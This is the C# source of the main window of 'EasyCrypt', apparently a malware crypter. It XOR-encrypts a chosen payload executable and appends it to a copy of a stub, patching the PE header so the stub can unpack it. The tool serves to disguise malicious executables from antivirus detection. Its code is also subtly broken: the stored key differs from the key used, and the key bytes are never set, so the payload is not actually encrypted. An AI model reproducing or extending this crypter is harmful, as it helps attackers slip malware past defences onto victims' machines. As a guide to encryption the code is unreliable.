﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using EasyStub.EasyCrypt.Core;

namespace EasyCrypt.UI.Forms
{
    public partial class MainWindow : Form
    {
        public MainWindow()
        {
            Icon = Properties.Resources.Guillendesign_Variations_3_Locks;
            InitializeComponent();
        }

        private void buttonCrypt_Click(object sender, EventArgs e)
        {
            string currentFileName = Assembly.GetEntryAssembly().Location;
            string currentDirectory = Path.GetDirectoryName(currentFileName);
            string outputFileName = Path.Combine(currentDirectory, "Crypted.exe");
            string stubFile = Path.Combine(currentDirectory, "EasyStub.exe");

            if (browsePayload.SelectedFile == null)
            {
                MessageBox.Show("You have to select a payload", "EasyCrypt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            if (!File.Exists(stubFile))
            {
                MessageBox.Show("The stub can not be found", "EasyCrypt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            // prompt save
            if (saveCryptedDialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                outputFileName = saveCryptedDialog.FileName;
            }

            // define our encryption key
            string encryptionKey = "HelloWorld1";

            // read payload
            byte[] payloadData = File.ReadAllBytes(browsePayload.SelectedFile.FullName);

            // encrypt payload
            byte[] encryptedData = EncryptDecryptData(payloadData, "myPrivateKey");

            // create settings
            EofData endOfFile = new EofData();
            endOfFile.EncryptedPayload = encryptedData;
            endOfFile.EncryptionKey = encryptionKey;

            // copy stub
            if (File.Exists(outputFileName))
                File.Delete(outputFileName);

            File.Copy(stubFile, outputFileName);

            // write settings to copy of stub
            FileInfo cryptedFile = new FileInfo(outputFileName);
            using (FileStream cryptedStream = cryptedFile.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
            {
                // parse e_lfanew value
                int e_lfanew = 0;
                byte[] e_lfanewData = new byte[4];
                cryptedStream.Seek(60, SeekOrigin.Begin);
                cryptedStream.Read(e_lfanewData, 0, e_lfanewData.Length);
                e_lfanew = BitConverter.ToInt32(e_lfanewData, 0);

                // seek to numberOfSymbols and write length of executable
                cryptedStream.Seek(e_lfanew + 0x10, SeekOrigin.Begin);
                cryptedStream.Write(BitConverter.GetBytes((int)cryptedStream.Length), 0, 4);

                // move to end of file
                cryptedStream.Seek(0, SeekOrigin.End);

                // serialize/write data
                endOfFile.Serialize(cryptedStream);
                cryptedStream.Flush();
            }

            MessageBox.Show("Successfully crypted payload!", "EasyCrypt", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        static byte[] EncryptDecryptData(byte[] inputData, string key)
        {
            byte[] encryptedData = new byte[inputData.Length];
            byte[] keyData = new byte[key.Length];
            for (int i = 0; i < keyData.Length; i++)
                keyData[i] = (byte)keyData[i];
            for (int i = 0; i < inputData.Length; i++)
                encryptedData[i] = (byte)(inputData[i] ^ (keyData[i % keyData.Length] % 256));
            return encryptedData;
        }
    }
}
